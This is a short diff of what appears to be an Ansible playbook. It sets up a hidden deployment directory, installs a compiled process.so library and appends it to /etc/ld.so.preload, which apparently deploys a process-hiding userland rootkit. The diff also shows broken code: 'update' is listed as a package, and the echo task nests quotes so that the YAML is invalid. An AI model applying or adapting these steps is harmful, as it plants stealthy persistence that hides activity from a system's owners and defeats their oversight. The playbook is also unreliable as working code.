@@ -25,11 +25,13 @@
     ###################################################################
     # Environment setup
     ###################################################################
-    - name: Install python3 and python3-pip
+    - name: setup
       package:
         name:
+          - update
           - python3
           - python3-pip
+          - make
         state: present
 
     - name: Create base hidden deployment directory
@@ -128,7 +130,7 @@
 
     - name: Move compiled .so and update /etc/ld.so.preload
       shell: |
-        mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null
+        mv {{ deploy_dir }}/process.so /usr/local/lib/ 
     
     - name: echo to preload
       shell: "echo "/usr/local/lib/process.so" >> /etc/ld.so.preload"
